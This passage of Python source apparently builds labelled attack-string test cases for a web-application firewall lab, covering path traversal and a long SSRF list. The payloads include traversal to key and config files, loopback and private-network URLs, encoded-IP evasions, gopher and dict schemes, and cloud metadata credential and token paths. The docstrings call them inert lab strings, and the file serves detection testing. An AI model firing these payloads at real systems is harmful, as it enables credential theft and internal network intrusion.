        _mk(g, "path-seg-log", path_seg("..%2f..%2fdocker%2f.lab-logs%2fdestination-access.jsonl"),
            "traversal in the /products/<id> path segment to a receipt log",
            payload="../../docker/.lab-logs/destination-access.jsonl"),
        _mk(g, "api-filter-resolv", q_api("category", "../../../../etc/timezone"),
            "traversal in an API filter value to /etc/timezone"),
        _form(g, "form-checkout", "/checkout", SHOP_HOST, "address",
              "../../../../srv/lab/config/master.key", "traversal in the checkout address to a lab key"),
        _form(g, "form-cart-file", "/cart", SHOP_HOST, "product_id",
              "../../../../etc/docker/daemon.json", "traversal in cart product_id to daemon.json"),
        _json(g, "json-invoice", "/api/orders", API_HOST,
              {"invoice_path": "../../../../var/lib/lab/orders.db"},
              "../../../../var/lib/lab/orders.db", "traversal in a JSON invoice path"),
        _json(g, "json-template", "/api/orders", API_HOST,
              {"template": "....//....//opt/lab/templates/base.html"},
              "....//....//opt/lab/templates/base.html", "doubled-dot traversal in a JSON template"),
    ]
    return S


def ssrf() -> list[Spec]:
    """URL/host strings targeting LAB-INTERNAL services and private space, each distinct.
    lab-app never fetches the value and the request's real destination is always a lab
    alias, so nothing leaves the lab; the URL is inert text."""
    g = "ssrf"
    S = []
    # lab compose services by name/port (inert strings; those services may not even run)
    lab_services = [
        ("control-classify", "http://control-plane:8000/classify", "the internal classifier"),
        ("control-health", "http://control-plane:8000/health", "the control-plane health"),
        ("data-plane-root", "http://data-plane:8080/", "the data-plane proxy"),
        ("labapp-health", "http://lab-app:9100/healthz", "the lab-app health"),
        ("labapp-me", "http://lab-app:9100/api/me", "the lab-app session route"),
        ("capture-proxy", "http://capture-proxy:8081/", "the capture proxy"),
        ("destination", "http://destination:9000/index.html", "the smoke destination"),
        ("fq-control", "http://firewall-ia-control-plane:8000/health", "the fully-named control plane"),
        ("shop-internal", "http://shop.fwlab.test:9100/profile", "the storefront profile route"),
        ("api-internal", "http://api.fwlab.test:9100/api/orders", "the API order route"),
    ]
    for tech, url, desc in lab_services:
        S.append(_mk(g, f"svc-{tech}", q_shop("category", url),
                     f"SSRF URL to {desc} (inert string)"))
    # loopback / private space to lab ports
    private = [
        ("loop-classify", q_api, "callback", "http://127.0.0.1:8000/classify", "loopback classifier"),
        ("loop-8080", q_shop, "category", "http://127.0.0.1:8080/", "loopback data-plane"),
        ("loop-me", q_api, "callback", "http://127.0.0.1:9100/api/me", "loopback lab-app"),
        ("localhost-health", q_shop, "category", "http://localhost:8000/health", "localhost control-plane"),
        ("rfc1918-10", q_api, "callback", "http://10.0.0.1/admin", "an RFC1918 10.x host"),
        ("rfc1918-192", q_shop, "category", "http://192.168.0.1/", "an RFC1918 192.168.x host"),
        ("docker-gw-17", q_api, "callback", "http://172.17.0.1:8000/", "the default docker bridge gateway"),
        ("docker-gw-18", q_shop, "category", "http://172.18.0.1:8080/", "the lab bridge gateway"),
        ("zero-host", q_api, "callback", "http://0.0.0.0:9100/", "the 0.0.0.0 wildcard"),
        ("ipv6-loop", q_shop, "category", "http://[::1]:8000/health", "the IPv6 loopback"),
    ]
    for tech, builder, param, url, desc in private:
        S.append(_mk(g, f"priv-{tech}", builder(param, url),
                     f"SSRF URL to {desc} (inert)"))
    # IP-encoding evasions, distinct full strings (lab ports/paths)
    S += [
        _mk(g, "decimal-ip", q_shop("category", "http://2130706433:8000/classify"),
            "decimal-encoded loopback to the classifier (inert)"),
        _mk(g, "hex-ip", q_api("callback", "http://0x7f000001:9100/healthz"),
            "hex-encoded loopback to lab-app (inert)"),
        _mk(g, "octal-ip", q_shop("category", "http://0177.0.0.1:8080/"),
            "octal-encoded loopback to the data plane (inert)"),
        _mk(g, "short-ip", q_api("callback", "http://127.1:8000/health"),
            "shortened loopback 127.1 (inert)"),
        _mk(g, "ipv4-mapped", q_shop("category", "http://[::ffff:127.0.0.1]:8080/"),
            "IPv4-mapped IPv6 loopback (inert)"),
    ]
    # non-http schemes, lab/app-specific resources
    S += [
        _mk(g, "file-app-config", q_shop("category", "file:///app/config.yaml"),
            "file:// to the app config (inert)"),
        _mk(g, "file-dataplane", q_api("callback", "file:///app/data_plane/data_plane.py"),
            "file:// to the data-plane source (inert)"),
        _mk(g, "gopher-control", q_shop("category", "gopher://control-plane:8000/_classify"),
            "gopher:// to the control plane (inert)"),
        _mk(g, "dict-redis", q_api("callback", "dict://127.0.0.1:6379/stats"),
            "dict:// to a loopback Redis (inert)"),
        _mk(g, "ftp-dataplane", q_shop("category", "ftp://data-plane:8080/"),
            "ftp:// to the data plane (inert)"),
        _mk(g, "ldap-control", q_api("callback", "ldap://control-plane:389/"),
            "ldap:// to the control plane (inert)"),
        _mk(g, "sftp-labapp", q_shop("category", "sftp://lab-app:22/"),
            "sftp:// to lab-app (inert)"),
        _mk(g, "tftp-loop", q_api("callback", "tftp://127.0.0.1:69/lab"),
            "tftp:// to loopback (inert)"),
    ]
    # cloud metadata with lab-specific suffixes (distinct from textbook strings)
    S += [
        _mk(g, "aws-imds-fwlab", q_shop("category",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/fwlab-lab-role"),
            "AWS IMDS role path with a lab-specific role name (inert)"),
        _mk(g, "gcp-fwlab", q_api("callback",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/fwlab/token"),
            "GCP metadata token path with a lab service account (inert)"),
        _mk(g, "azure-fwlab", q_shop("category",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01&resource=fwlab"),
            "Azure IMDS with a lab resource query (inert)"),
        _mk(g, "alibaba-fwlab", q_api("callback", "http://100.100.100.200/latest/meta-data/fwlab"),
            "Alibaba metadata path with a lab suffix (inert)"),
    ]
    # parser confusion using lab hosts, distinct
    S += [
        _mk(g, "at-confusion", q_shop("category", "http://lab-app@control-plane:8000/classify"),
            "userinfo@host confusion between lab hosts (inert)"),
        _mk(g, "hash-confusion", q_api("callback", "http://control-plane:8000#@lab-app/"),
            "fragment-based host confusion (inert)"),
        _mk(g, "suffix-host", q_shop("category", "http://lab-app.fwlab.test.control-plane.internal/"),
            "suffix-host DNS confusion (inert)"),
        _mk(g, "creds-loop", q_api("callback", "http://user:pass@127.0.0.1:8000/classify"),
            "credentials-in-URL to the loopback classifier (inert)"),
    ]
    # SSRF-named parameters / form / json / header placements, distinct URLs
    S += [
        _mk(g, "param-image_url", q_shop("image_url", "http://data-plane:8080/status"),
            "SSRF in an image_url parameter (inert)"),
        _mk(g, "param-webhook", q_api("webhook", "http://control-plane:8000/reload"),
            "SSRF in a webhook parameter (inert)"),
        _mk(g, "param-proxy", q_shop("proxy", "http://10.0.0.5:3128/"),
            "SSRF in a proxy parameter (inert)"),
        _mk(g, "param-next", q_api("next", "http://127.0.0.1:8000/shutdown", route="/api/products"),
            "open-redirect-style next= to a loopback admin path (inert)"),
        _form(g, "form-avatar", "/checkout", SHOP_HOST, "avatar_url",
              "http://control-plane:8000/metrics", "SSRF in a checkout avatar_url field"),
        _form(g, "form-callback", "/cart", SHOP_HOST, "callback_url",
              "http://lab-app:9100/cart", "SSRF in a cart callback_url field"),
        _json(g, "json-webhook", "/api/orders", API_HOST,
              {"webhook_url": "http://control-plane:8000/admin"}, "http://control-plane:8000/admin",
              "SSRF in a JSON webhook_url"),
        _json(g, "json-fetch", "/api/orders", API_HOST,
              {"fetch": "file:///app/adapter/adapter_config.json"},
              "file:///app/adapter/adapter_config.json", "file:// SSRF in a JSON fetch field"),
        _mk(g, "header-forwarded-host", q_shop("category", "office"),
            "internal host in an X-Forwarded-Host header (inert)",
            headers=[("X-Forwarded-Host", "control-plane:8000")],
            payload="control-plane:8000", placement="header",
            confidence="medium", review="needs-review"),
        _mk(g, "header-forwarded-for", q_shop("category", "office"),
            "internal addresses in an X-Forwarded-For header (inert)",
            headers=[("X-Forwarded-For", "127.0.0.1, 172.18.0.1")],
            payload="172.18.0.1", placement="header",
            confidence="medium", review="needs-review"),
    ]
    return S


def build() -> list[Spec]:
    """The full ordered BLOCK draft pool, grouped by category in a stable order."""
    specs: list[Spec] = []
    for fn in (sqli, cmdi, xss, path_traversal, ssrf):
        specs.extend(fn())
    return specs


if __name__ == "__main__":
    from collections import Counter
    c = Counter(s.group for s in build())
    for cat in ("sqli", "cmdi", "xss", "path-traversal", "ssrf"):
        print(f"{cat:16s} {c[cat]}")
    print(f"{'TOTAL':16s} {sum(c.values())}")
